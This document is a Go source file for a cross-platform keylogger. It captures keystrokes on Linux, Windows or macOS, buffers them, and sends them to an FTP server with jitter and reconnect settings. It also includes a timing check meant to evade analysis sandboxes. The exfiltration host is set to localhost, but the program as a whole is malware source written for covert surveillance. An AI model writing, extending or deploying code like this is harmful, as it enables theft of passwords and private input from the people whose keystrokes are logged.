package main

import (
	"bytes"
	"log"
	"runtime"
	"time"

	"github.com/adelapazborrero/logger/connector"
	"github.com/adelapazborrero/logger/linux"
	"github.com/adelapazborrero/logger/mac"
	"github.com/adelapazborrero/logger/windows"
)

const (
	FTP_HOST        = "localhost:21"
	DEFAULT_TIMEOUT = 5 * time.Second
	RECONNECT_DELAY = 5 * time.Second
	MAX_JITTER      = 5
	USERNAME        = "anonymous"
	PASSWORD        = ""
	LOG_BUFFER_SIZE = 1024
)

func main() {
	now := time.Now()
	time.Sleep(3 * time.Second)

	if time.Since(now) < 3*time.Second {
		log.Fatal("Nothing to do. Exiting...")
		return
	}

	logBuffer := new(bytes.Buffer)

	switch runtime.GOOS {
	case "linux":
		go linux.CaptureKeyboardKeysLinux(logBuffer)
	case "windows":
		go windows.CaptureKeyboardKeysWindows(logBuffer)
	case "darwin":
		go mac.CaptureKeyboardKeysDarwin(logBuffer)
	default:
		log.Fatal("Unsupported operating system")
		return
	}

	ftp := connector.NewFTP(FTP_HOST, USERNAME, PASSWORD, DEFAULT_TIMEOUT, MAX_JITTER, RECONNECT_DELAY)

	ftp.SendData(logBuffer)
}
